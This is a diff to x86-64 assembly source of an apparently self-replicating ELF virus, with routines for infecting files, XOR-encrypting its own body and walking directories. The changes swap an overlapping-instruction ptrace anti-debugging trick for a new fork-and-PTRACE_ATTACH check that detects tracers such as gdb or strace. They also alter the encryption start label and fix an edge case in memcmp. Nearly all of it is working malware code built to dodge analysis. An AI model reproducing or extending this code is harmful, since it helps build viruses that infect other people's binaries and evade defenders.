@@ -48,18 +48,9 @@ _h3ll0w0rld:
 	push rax
 %endif
 
-	; --- START OF HELL
-	; THIS PART IS BLACK MAGIC, DON'T EDIT IT
-	; I'm kidding it's overlapping instruction and jmp
+	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
-	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
-	; binary (gdb, strace, ...), and then it select host or not launching
-	.dont_gdb_bro:
-	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
-	; -- has to skip 2 byte of instruction next line
-	mov rsi, 0x02ebc93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
-	mov rax, 0xc303eb050f58656a; push 101; pop rax; syscall; jmp $+5; ret
-	jmp .dont_gdb_bro + 2
+	call _check_if_traced
 
 	cmp rax, 0x0
 	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
@@ -83,7 +74,7 @@ _h3ll0w0rld:
 		sub rdx, rsi
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
-		lea rdx, [rel _h3ll0w0rld]
+		lea rdx, [rel _check_if_traced]
 		mov rcx, KEY_SIZE
 		call _xor_encrypt
 		pop rdx
@@ -102,7 +93,7 @@ _h3ll0w0rld:
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
 	.ft_juggling:
-	mov rax, 0xc0314830eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	mov rax, 0xc0314837eb050f42; 42[syscall][jmp .infected][xor rax, rax]
 
 	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -138,6 +129,90 @@ _h3ll0w0rld:
 		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
 			mov rax, 0x4e49474755424544
 			db `G..\n`, 0x0
+
+_check_if_traced:
+	push rdi
+	push rsi
+	push rcx
+	push rdx
+	push r8
+
+	push SYSCALL_GETPID; getpid
+	pop rax
+	syscall
+
+	push PR_SET_PTRACER
+	pop rdi
+	push rax
+	pop rsi
+	xor rdx, rdx
+	xor rcx, rcx
+	xor r8, r8
+	push SYSCALL_PRCTL; prctl
+	pop rax
+	syscall
+
+	push SYSCALL_FORK
+	pop rax; fork
+	syscall
+
+	cmp rax, 0x0
+	jne .parent
+
+	.child:
+		push SYSCALL_GETPPID; getppid
+		pop rax
+		syscall
+		push rax
+		pop r8
+
+		push PTRACE_ATTACH
+		pop rdi
+		mov rsi, r8; ppid
+		push SYSCALL_PTRACE; ptrace
+		pop rax
+		syscall
+
+		cmp rax, 0x0
+		jne .traced
+
+		push r8
+		pop rdi
+		xor rsi, rsi
+		push SYSCALL_WAIT4; wait4
+		pop rax
+		syscall
+
+		xor rdi, rdi
+
+		jmp .exit
+		.traced:
+			push 1
+			pop rdi
+
+		.exit:
+			push SYSCALL_EXIT
+			pop rax
+			syscall
+
+	.parent:
+		sub rsp, 8
+		push rax
+		pop rdi
+		lea rsi, [rsp - 8]
+		push SYSCALL_WAIT4
+		pop rax
+		syscall
+
+		WEXITSTATUS rax, qword [rsp - 8]
+		add rsp, 8
+
+	pop r8
+	pop rdx
+	pop rcx
+	pop rsi
+	pop rdi
+ret
 
 ;                      v dst       v len      v key       v key_size
 _xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
@@ -334,7 +409,7 @@ ret
 _pack_start:
 _search_dir:
 %ifndef FSOCIETY
-	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
+;	call _h3ll0w0rld + 35; jmp to ret to check for ptrace locked
 %else
 	call _h3ll0w0rld + 44; jmp to ret to check for ptrace locked
 
@@ -733,7 +808,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rsi, rdx; [rel length]
 			push rdx
 			sub rsi, rcx ; length - (_virus - _params)
-			lea rdx, [rel _h3ll0w0rld]
+			lea rdx, [rel _check_if_traced]
 			mov rcx, KEY_SIZE
 			call _xor_encrypt
 			pop rdx
@@ -920,6 +995,8 @@ _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
 
 	xor rax, rax
 	xor rcx, rcx; = 0
+	cmp rcx, rdx
+	je .empty_return
 	.loop_byte:
 		mov al, [rdi + rcx]
 		cmp al, [rsi + rcx]
@@ -930,6 +1007,7 @@ _ft_memcmp: ; (void *rdi, void *rsi, size_t rdx)
 	jmp .loop_byte
 	.return:
 		sub al, [rsi + rcx]
+	.empty_return:
 
 	inc rdx
 	pop rcx
